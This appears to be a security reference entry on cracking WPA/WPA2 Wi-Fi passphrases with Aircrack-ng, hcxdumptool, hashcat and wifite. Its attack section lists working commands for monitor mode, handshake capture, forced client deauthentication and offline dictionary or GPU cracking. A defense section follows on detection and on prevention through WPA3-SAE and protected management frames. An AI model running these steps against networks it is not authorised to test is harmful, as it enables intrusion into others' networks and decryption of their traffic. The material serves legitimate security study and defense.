name: Aircrack-ng - WPA/WPA2 Handshake Cracking
description: The Aircrack-ng suite captures and cracks Wi-Fi. airmon-ng enables monitor mode, airodump-ng scans and captures the WPA/WPA2 4-way handshake (or PMKID), aireplay-ng deauthenticates clients to force a handshake, and aircrack-ng runs a dictionary attack against the captured handshake to recover the passphrase.
notes:
=== MONITOR MODE ===
  airmon-ng check kill
  airmon-ng start <interface>        # -> <interface>mon (e.g. wlan0mon)

=== SCAN ===
  airodump-ng <interface>mon         # list APs: BSSID, CH, ESSID, clients

=== TARGETED CAPTURE (lock to channel + write pcap) ===
  airodump-ng -c <ch> --bssid <target> -w cap <interface>mon
  # wait for 'WPA handshake: <BSSID>' in the top-right

=== FORCE A HANDSHAKE (deauth a client) ===
  aireplay-ng -0 5 -a <target> -c <client_mac> <interface>mon

=== CRACK ===
  aircrack-ng -w <wordlist> -b <target> cap-01.cap
  # or convert + GPU crack with hashcat (mode 22000)

=== PMKID (clientless) ===
  hcxdumptool / hcxpcapngtool -> hashcat -m 22000

=== ALTERNATIVES ===
  wifite       # automates the whole flow
  hashcat -m 22000   # GPU cracking of the handshake/PMKID
  hcxdumptool  # PMKID capture

recommended.note: wifite automates capture + crack end to end.
Crack the converted handshake on GPU (mode 22000).

defense.why_it_works: WPA2-PSK authentication derives keys from the passphrase; the 4-way handshake (or a PMKID) lets an attacker brute-force that passphrase offline. Deauthentication frames (unprotected in WPA2) force clients to reconnect and expose the handshake.
defense.prerequisites: A wireless adapter supporting monitor mode and injection, within RF range of the target network.
defense.impact: Recovery of the Wi-Fi passphrase, granting full network access and the ability to decrypt captured traffic.
defense.detection: [MITRE T1040] WIDS/WIPS alerts on deauthentication floods and monitor-mode/rogue adapters; spikes of 802.11 deauth/disassoc frames; clients repeatedly reassociating.
defense.artifacts: Wireless controller/WIDS logs (deauth flood, unknown MACs), repeated client disconnect/reconnect events, management-frame anomalies.
defense.prevention: Use WPA3-SAE (resists offline cracking) or long random WPA2 passphrases (20+ chars); enable 802.11w Protected Management Frames to block deauth; WPA2-Enterprise (EAP) instead of PSK; deploy WIPS to detect deauth/rogue APs; segment and monitor wireless.
